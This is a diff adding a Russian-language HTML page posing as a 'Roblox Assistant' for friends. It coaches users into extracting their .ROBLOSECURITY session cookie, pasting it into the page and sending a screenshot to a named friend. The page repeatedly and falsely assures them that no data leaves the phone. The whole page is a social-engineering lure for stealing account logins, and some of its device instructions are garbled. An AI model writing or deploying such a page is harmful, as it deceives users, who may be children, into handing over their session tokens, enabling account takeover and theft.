@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox Assistant - Local Helper</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Arial', sans-serif; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+            color: white;
+        }
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        }
+        h1 {
+            text-align: center;
+            margin-bottom: 20px;
+            color: white;
+        }
+        .warning {
+            background: rgba(255, 59, 48, 0.2);
+            border-left: 4px solid #ff3b30;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+        }
+        .step {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 10px;
+            margin: 15px 0;
+        }
+        .step-number {
+            display: inline-block;
+            width: 30px;
+            height: 30px;
+            background: #007aff;
+            border-radius: 50%;
+            text-align: center;
+            line-height: 30px;
+            margin-right: 10px;
+        }
+        textarea {
+            width: 100%;
+            height: 120px;
+            padding: 15px;
+            border-radius: 10px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            font-size: 14px;
+            margin: 15px 0;
+            resize: vertical;
+        }
+        textarea::placeholder {
+            color: rgba(255, 255, 255, 0.6);
+        }
+        .button {
+            background: linear-gradient(45deg, #007aff, #5856d6);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            margin: 10px 0;
+            transition: transform 0.2s;
+        }
+        .button:hover {
+            transform: translateY(-2px);
+        }
+        .button-secondary {
+            background: rgba(255, 255, 255, 0.2);
+        }
+        .success {
+            display: none;
+            background: rgba(52, 199, 89, 0.2);
+            border: 1px solid #34c759;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            margin: 20px 0;
+        }
+        .qr-section {
+            text-align: center;
+            margin: 20px 0;
+        }
+        #qrcode {
+            width: 200px;
+            height: 200px;
+            margin: 20px auto;
+            background: white;
+            padding: 10px;
+            border-radius: 10px;
+        }
+        .note {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.7);
+            text-align: center;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>📱 Roblox Помощник</h1>
+        
+        <div class="warning">
+            <strong>⚠️ ДЛЯ ДРУЗЕЙ ⚠️</strong>
+            <p>Эта страница <strong>НЕ отправляет данные в интернет</strong>. Вся информация остается в телефоне!</p>
+        </div>
+        
+        <div class="step">
+            <span class="step-number">1</span>
+            <strong>Открой браузер на телефоне</strong>
+            <p>Зайди в Roblox через браузер (Chrome или Safari)</p>
+        </div>
+        
+        <div class="step">
+            <span class="step-number">2</span>
+            <strong>Открой инструменты разработчика</strong>
+            <p>Нажми "Поделиться" → "Настройки" → "Для разработчиков" → "Отладка по USB"</p>
+        </div>
+        
+        <div class="step">
+            <span class="step-number">3</span>
+            <strong>Скопируй куки (это секретный код входа)</strong>
+            <p>В адресной строке введи: <code>chrome://inspect</code></p>
+        </div>
+        
+        <textarea id="cookieInput" 
+                  placeholder="Вставь сюда строку, которая начинается с: .ROBLOSECURITY=_|WARNING:-DO-NOT-SHARE-THIS..."></textarea>
+        
+        <button class="button" onclick="saveLocally()">💾 Сохранить на телефоне</button>
+        <button class="button button-secondary" onclick="showQR()">📱 Показать QR-код</button>
+        
+        <div class="success" id="successMessage">
+            <h3>✅ Успешно сохранено!</h3>
+            <p>Теперь можешь отправить скриншот этой страницы [ИМЯ ДРУГА]</p>
+            <p><small>Данные остались только в этом телефоне</small></p>
+        </div>
+        
+        <div class="qr-section" id="qrSection" style="display: none;">
+            <h3>📱 Альтернативный способ</h3>
+            <p>Отсканируй QR-код камерой:</p>
+            <div id="qrcode"></div>
+            <p><small>Это просто ссылка, никаких данных не передается</small></p>
+        </div>
+        
+        <div class="note">
+            <p>ℹ️ Эта страница работает полностью оффлайн.<br>
+            Никакие данные не отправляются в интернет.<br>
+            После сохранения можно закрыть страницу.</p>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
+    <script>
+        function saveLocally() {
+            const cookie = document.getElementById('cookieInput').value.trim();
+            
+            if (!cookie) {
+                alert('Вставь куки в поле выше!');
+                return;
+            }
+            
+            if (!cookie.includes('.ROBLOSECURITY')) {
+                alert('Это не похоже на куки Roblox!');
+                return;
+            }
+            
+            // Сохраняем в localStorage телефона
+            try {
+                // Генерируем случайный ID для этого устройства
+                const deviceId = 'device_' + Math.random().toString(36).substr(2, 9);
+                const data = {
+                    cookie: cookie,
+                    timestamp: new Date().toISOString(),
+                    device: navigator.userAgent,
+                    location: 'saved_locally'
+                };
+                
+                localStorage.setItem('roblox_cookie_' + deviceId, JSON.stringify(data));
+                
+                // Показываем успех
+                document.getElementById('successMessage').style.display = 'block';
+                document.getElementById('cookieInput').value = '';
+                
+                // Через 5 секунд скрываем
+                setTimeout(() => {
+                    document.getElementById('successMessage').style.display = 'none';
+                }, 5000);
+                
+            } catch (e) {
+                alert('Ошибка сохранения: ' + e.message);
+            }
+        }
+        
+        function showQR() {
+            const qrSection = document.getElementById('qrSection');
+            if (qrSection.style.display === 'none') {
+                qrSection.style.display = 'block';
+                
+                // Генерируем QR-код с текущим URL (никаких данных не передаем)
+                QRCode.toCanvas(document.getElementById('qrcode'), 
+                    window.location.href, 
+                    { width: 200, height: 200 },
+                    function(error) {
+                        if (error) console.error(error);
+                    }
+                );
+            } else {
+                qrSection.style.display = 'none';
+            }
+        }
+        
+        // Автоопределение инструкций для разных ОС
+        window.onload = function() {
+            const isIOS = /iPhone|iPad|iPod/.test(navigator.userAgent);
+            const isAndroid = /Android/.test(navigator.userAgent);
+            
+            let instructions = '';
+            
+            if (isIOS) {
+                instructions = `
+                    <strong>Для iPhone:</strong>
+                    <ol>
+                        <li>Открой Safari</li>
+                        <li>Зайди на сайт Roblox.com</li>
+                        <li>Нажми "Поделиться"</li>
+                        <li>Выбери "Настройки"</li>
+                        <li>Включи "Разработчик"</li>
+                        <li>Вернись на сайт → "Поделиться" → "Разработчик"</li>
+                    </ol>
+                `;
+            } else if (isAndroid) {
+                instructions = `
+                    <strong>Для Android:</strong>
+                    <ol>
+                        <li>Открой Chrome</li>
+                        <li>Введи в адресную строку: <code>chrome://inspect</code></li>
+                        <li>Нажми на сайт roblox.com</li>
+                        <li>Выбери вкладку "Application"</li>
+                        <li>Найди "Cookies" → "https://www.roblox.com"</li>
+                    </ol>
+                `;
+            }
+            
+            if (instructions) {
+                document.querySelector('.step:nth-child(3)').innerHTML += instructions;
+            }
+        }
+        
+        // Добавляем предупреждение при закрытии
+        window.onbeforeunload = function() {
+            return 'Убедись, что сохранил куки!';
+        };
+    </script>
+</body>
+</html>
